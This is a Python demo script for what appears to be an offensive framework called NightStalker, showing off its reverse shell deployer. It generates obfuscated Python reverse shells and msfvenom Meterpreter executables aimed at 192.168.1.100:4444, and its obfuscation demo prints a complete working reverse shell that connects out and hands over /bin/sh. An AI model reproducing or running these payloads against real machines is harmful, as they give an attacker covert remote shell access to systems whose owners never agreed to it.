#!/usr/bin/env python3
"""
NightStalker Reverse Shell Deployer Demo
Demonstrates the reverse shell deployment capabilities
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from nightstalker.core.reverse_shell_deployer import ReverseShellDeployer

def demo_basic_deployment():
    """Demonstrate basic reverse shell deployment"""
    print("🌙 NightStalker Reverse Shell Deployer Demo")
    print("=" * 50)
    
    deployer = ReverseShellDeployer()
    
    # List available payload types
    print("\n📋 Available Payload Types:")
    deployer.list_payloads()
    
    # Demo Python reverse shell
    print("\n🎯 Demo: Python Reverse Shell")
    print("-" * 30)
    
    options = {
        'payload_type': 'python',
        'target_ip': '192.168.1.100',
        'port': 4444,
        'obfuscation': True,
        'options': {
            'use_requests': True
        },
        'deploy_method': '1'  # Save to file
    }
    
    results = deployer.deploy(options)
    
    if results.get('success', False):
        print("✅ Python reverse shell deployed successfully!")
        if 'filepath' in results:
            print(f"📁 Payload saved to: {results['filepath']}")
    else:
        print(f"❌ Deployment failed: {results.get('error', 'Unknown error')}")

def demo_msfvenom_payload():
    """Demonstrate msfvenom payload generation"""
    print("\n🎯 Demo: Metasploit msfvenom Payload")
    print("-" * 40)
    
    deployer = ReverseShellDeployer()
    
    options = {
        'payload_type': 'msfvenom',
        'target_ip': '192.168.1.100',
        'port': 4444,
        'obfuscation': True,
        'options': {
            'payload_name': 'windows/meterpreter/reverse_tcp',
            'format': 'exe'
        },
        'deploy_method': '1'
    }
    
    print("⚠️  Note: This demo requires msfvenom to be installed")
    print("   Install Metasploit Framework to use this feature")
    
    # Check if msfvenom is available
    import subprocess
    try:
        subprocess.run(['msfvenom', '--help'], capture_output=True, check=True)
        print("✅ msfvenom found, proceeding with demo...")
        
        results = deployer.deploy(options)
        
        if results.get('success', False):
            print("✅ msfvenom payload deployed successfully!")
            if 'filepath' in results:
                print(f"📁 Payload saved to: {results['filepath']}")
        else:
            print(f"❌ Deployment failed: {results.get('error', 'Unknown error')}")
            
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("❌ msfvenom not found. Skipping msfvenom demo.")

def demo_network_detection():
    """Demonstrate network detection capabilities"""
    print("\n🎯 Demo: Network Detection")
    print("-" * 25)
    
    deployer = ReverseShellDeployer()
    network_info = deployer.get_network_info()
    
    print(f"🌐 Local IP: {network_info['local_ip']}")
    print(f"🔌 Interface: {network_info['interface']}")
    print(f"🔧 Default Port: {deployer.default_port}")

def demo_obfuscation():
    """Demonstrate obfuscation capabilities"""
    print("\n🎯 Demo: Payload Obfuscation")
    print("-" * 30)
    
    deployer = ReverseShellDeployer()
    
    # Simple demo payload
    demo_payload = '''#!/usr/bin/env python3
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
    
    print("📝 Original Payload:")
    print("-" * 20)
    print(demo_payload)
    
    print("\n🔒 Obfuscated Payload:")
    print("-" * 20)
    obfuscated = deployer.obfuscate_payload(demo_payload, 'python')
    print(obfuscated)

def demo_interactive_mode():
    """Demonstrate interactive deployment mode"""
    print("\n🎯 Demo: Interactive Deployment Mode")
    print("-" * 40)
    print("This would normally prompt for user input.")
    print("For demo purposes, we'll show the expected flow:")
    
    print("\n1. Select payload type (nc, msfvenom, python, bash, powershell)")
    print("2. Enter target IP address")
    print("3. Enter port number")
    print("4. Enable/disable obfuscation")
    print("5. Configure payload-specific options")
    print("6. Choose deployment method")
    
    print("\n💡 To try interactive mode, run:")
    print("   nightstalker reverse-shell deploy")

def main():
    """Main demo function"""
    print("🌙 NightStalker Reverse Shell Deployer Demo")
    print("=" * 60)
    print("This demo showcases the reverse shell deployment capabilities")
    print("of the NightStalker framework.")
    print()
    
    try:
        # Run demos
        demo_network_detection()
        demo_basic_deployment()
        demo_msfvenom_payload()
        demo_obfuscation()
        demo_interactive_mode()
        
        print("\n" + "=" * 60)
        print("✅ Demo completed successfully!")
        print("\n📚 For more information, see:")
        print("   docs/REVERSE_SHELL_DEPLOYER.md")
        print("\n🚀 To use the deployer:")
        print("   nightstalker reverse-shell deploy")
        print("   nightstalker reverse-shell list")
        
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        print("Please check your NightStalker installation.")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main()) 